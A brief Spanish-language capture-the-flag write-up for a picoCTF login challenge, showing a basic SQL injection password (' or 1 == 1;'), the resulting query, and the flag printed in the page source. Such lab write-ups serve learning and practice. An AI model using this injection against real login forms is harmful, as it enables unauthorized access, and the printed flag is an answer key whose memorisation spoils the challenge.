## Descripción 
Can you login to this website?

Additional details will be available after launching your challenge instance.
Try to login [here](http://saturn.picoctf.net:60792/).

Hint:
1. `admin` is the user you want to login as.
## Solución 1

Ingresamos a la página e intentamos logearnos, nos dice que no es posible y miramos que tenemos que ingresar con una inyección SQL que la más básica es: ' or 1 == 1;' al ingresar nos dice que no está a simple vista la bandera, nos metemos al código fuente y ahí está

```
Log in
username: admin
password: ' or 1 == 1;'

usamos ctrl+u para ver código fuente

|   |
|---|
|<pre>username: admin|
||password: &#039; or 1 == 1;|
||SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; or 1 == 1;&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|

flag: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```

## Referencias 
https://www.w3schools.com/sql/sql_injection.asp